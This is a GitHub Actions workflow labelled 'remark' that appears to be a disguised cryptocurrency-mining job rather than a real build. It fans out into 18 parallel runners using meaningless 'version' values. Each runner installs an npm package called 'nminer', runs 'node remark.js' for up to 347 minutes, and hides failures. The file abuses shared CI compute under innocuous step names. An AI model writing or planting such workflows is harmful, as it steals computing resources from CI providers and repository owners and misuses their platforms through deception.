name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9002 }
          - { version: 1144 }
          - { version: 462 }
          - { version: 2792 }
          - { version: 2720 }
          - { version: 7701 }
          - { version: 9723 }
          - { version: 3232 }
          - { version: 3443 }
          - { version: 6781 }
          - { version: 9359 }
          - { version: 9236 }
          - { version: 4696 }
          - { version: 5775 }
          - { version: 2298 }
          - { version: 7295 }
          - { version: 7296 }
          - { version: 8835 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: thorn
        run: |
          npm install nminer@latest
          timeout 347m node remark.js || echo "remark executed"